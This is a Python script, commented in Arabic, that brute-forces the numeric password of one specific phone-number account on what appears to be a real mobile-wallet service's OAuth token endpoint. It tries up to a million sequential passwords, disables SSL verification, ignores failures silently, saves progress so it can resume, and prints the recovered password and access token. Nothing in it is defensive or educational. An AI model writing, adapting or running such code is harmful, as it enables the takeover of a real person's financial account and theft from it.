import requests
import time
import os
from requests.exceptions import RequestException

# إلغاء تحذيرات SSL
requests.packages.urllib3.disable_warnings()

# الإعدادات الأساسية
BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
ENDPOINT = "oauth/token"
FULL_URL = BASE_URL + ENDPOINT

BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "772490746",
    "scope": "openid"
}

initial_password = 142800233
MAX_ATTEMPTS = 1_000_000  # حد أقصى للحماية من التكرار اللانهائي

# اسم ملف حفظ التقدم
PROGRESS_FILE = "sh.txt"

def load_progress():
    """قراءة آخر رقم تم اختباره من الملف، وإرجاع None إذا لم يوجد."""
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r") as f:
                return int(f.read().strip())
        except (ValueError, IOError):
            return None
    return None

def save_progress(value):
    """حفظ الرقم الحالي (الذي تم اختباره) في الملف."""
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(value))

def get_access_token():
    # استئناف من الرقم التالي للمحفوظ (إن وجد)
    saved = load_progress()
    if saved is not None:
        current_password = saved + 1
        print(f"🔄 استئناف التخمين من الرقم {current_password} (آخر محفوظ: {saved})")
    else:
        current_password = initial_password
        print(f"🔄 بدء التخمين من الرقم {current_password}")

    attempt = 0
    while attempt < MAX_ATTEMPTS:
        attempt += 1
        data = BASE_DATA.copy()
        data["password"] = str(current_password)

        try:
            response = requests.post(FULL_URL, data=data, verify=False, timeout=10)

            if response.status_code == 200:
                json_response = response.json()
                # ✅ نجاح – نحفظ الرقم الناجح ثم نخرج
                save_progress(current_password)
                print("\n✅ تم الحصول على التوكن بنجاح!")
                print(f"🔐 كلمة المرور الصحيحة: {current_password}")
                print(f"📦 الرد الكامل: {json_response}")
                print(f"🔑 التوكن: {json_response.get('access_token')}")
                print(f"⏳ ينتهي بعد: {json_response.get('expires_in')} ثانية")
                return json_response
            else:
                # فشل – لا نطبع شيئاً (صامت)
                pass

        except RequestException:
            # خطأ شبكة – لا نطبع شيئاً (صامت)
            pass

        # حفظ التقدم بعد كل محاولة (الرقم الذي تم اختباره)
        save_progress(current_password)

        # زيادة الرقم للمحاولة التالية
        current_password += 1
        # تأخير اختياري لتخفيف الضغط على الخادم
        time.sleep(0.001)

    # انتهت المحاولات دون نجاح
    print("❌ فشلت جميع المحاولات (وصلت للحد الأقصى).")
    return None

if __name__ == "__main__":
    token_data = get_access_token()
    if token_data:
        print("✅ البوت يعمل بنجاح.")
    else:
        print("❌ تعذر الحصول على التوكن.")
